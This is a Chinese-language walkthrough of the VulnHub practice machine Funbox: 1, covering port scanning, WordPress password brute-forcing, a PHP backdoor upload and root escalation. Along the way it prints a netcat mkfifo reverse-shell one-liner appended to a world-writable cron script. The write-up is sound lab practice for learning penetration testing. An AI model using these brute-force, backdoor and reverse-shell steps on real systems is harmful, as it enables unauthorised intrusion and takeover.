# Funbox: 1

2024-5-23 https://www.vulnhub.com/entry/funbox-1,518/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 21,22,80,33060

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d2f6531b5a497d748d44f546e39329d3 (RSA)
|   256 a6836f1b9cdab4418c29f4ef334b20e0 (ECDSA)
|_  256 a65b800350199166b6c398b8c44f5cbd (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/secret/
|_http-title: Did not follow redirect to http://funbox.fritz.box/
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

21 ftp 端口不允许匿名登陆。

22 ssh banner 没提示信息。

mysql 暂时也没 root 用户密码，先看看 80 web 服务有什么信息，跳转到了 funbox.fritz.box 域名，看样子要在本地/etc/hosts 文件中添加这个域名。

http://funbox.fritz.box/ 主页是 wordpress 搭建的网站，还是老方法，wpscan 找用户，然后爆破找密码。

```
wpscan --url http://funbox.fritz.box/ -e u
```

找到用户名: admin 和 joe

使用 rockyou 作为字典，进行爆破：

```
wpscan --url http://funbox.fritz.box/ -U user.txt -P ~/tools/dict/rockyou.txt  -t 30

[!] Valid Combinations Found:
 | Username: joe, Password: 12345
 | Username: admin, Password: iubire
```

2 个用户的密码已经找到，登陆到 wp 看看有没有修改页面的权限，能够写入后门代码。

joe 没有修改权限，admin 有修改权限。

admin 登陆后，在 Themes 中 Add New ，然后在/wp-content/uploads 目录中就能找到我们的后门 php 代码。kali 上监听 8888 端口，访问后门代码，激活反弹 shell：

```
curl http://funbox.fritz.box/wp-content/uploads/2024/05/8888.php
```

先升级下 tty，查询到 wordpress 的数据库配置文件：

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'localhost');
```

/home/funny 文件夹中发现一个 backup.sh 文件：

```
www-data@funbox:/home/funny$ cat .backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
```

是定时本非/var/www/html 文件夹中的内容到 funny 目录。

通过观察发现，这个脚本 2 分钟执行一次：

```
-rw-rw-r-- 1 funny funny 48701440 May 23 04:45 html.tar
-rw-rw-r-- 1 funny funny 48701440 May 23 04:46 html.tar
```

这个脚本有全局写权限，可以将我们的攻击代码写入到脚本中，等待 2 分钟，就能得到反弹的 shell。目标机器上有 nc，所以使用 nc 反弹：

```
cd /home/funny
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.5.3 7777 >/tmp/f' >> .backup.sh
```

得到了反弹的 shell：

```
funny@funbox:~$ id
id
uid=1000(funny) gid=1000(funny) groups=1000(funny),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

经过对系统枚举，sudo、suid、cap 等都没发现可利用点。观察了 html.tar 的生成时间，使用 pspy 进行监控，发现每隔 5 分钟以 root 权限用户又生成了一次。

在每 5 分钟前创建监听，避开每 2 分钟的反弹，最后反弹的 shell 是 root 的:

```
root@funbox:~# cat flag.txt
cat flag.txt
Great ! You did it...
FUNBOX - made by @0815R2d2

crontab -l
*/5 * * * * /home/funny/.backup.sh
```

funny 属于 lxd 用户组，也可以用 lxc 进行升级，可将/root 目录挂在到/mnt/root/中，利用方法 https://www.hackingarticles.in/lxd-privilege-escalation/
